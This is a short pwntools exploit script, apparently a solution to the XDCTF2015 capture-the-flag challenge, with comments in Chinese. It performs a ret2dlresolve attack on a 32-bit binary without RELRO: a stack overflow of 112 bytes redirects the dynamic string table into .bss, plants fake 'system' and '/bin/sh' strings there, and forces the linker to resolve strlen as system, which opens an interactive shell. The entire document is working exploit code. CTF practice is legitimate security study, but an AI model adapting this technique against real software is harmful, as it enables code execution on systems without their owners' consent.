from pwn import *
context(arch = 'i386', os = 'linux', log_level = 'debug')
p	= process('./main_no_relro_32')
elf	= ELF('./main_no_relro_32')

dl			= 0x08048386
STRTAB		= 0x08049804 + 0x4
bss_addr	= elf.bss()
read_plt	= elf.plt['read']
strlen_plt	= elf.plt['strlen']
vuln_addr	= elf.symbols['vuln']

p.recvuntil('Welcome to XDCTF2015~!\n')

# 修改STRTAB的值指向bss段
p.send(b'a' * 112 + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(STRTAB) + p32(4))
p.send(p32(bss_addr - 0x20))

# 在bss段写入伪造的字符串
p.send(b'a' * 112 + p32(read_plt) + p32(vuln_addr) + p32(0) + p32(bss_addr) + p32(15))
p.send(b'system\x00/bin/sh\x00')

# 调用strlen的plt的第二部分去重定向strlen
p.send(b'a' * 112 + p32(dl) + p32(vuln_addr) + p32(bss_addr + 7))

p.interactive()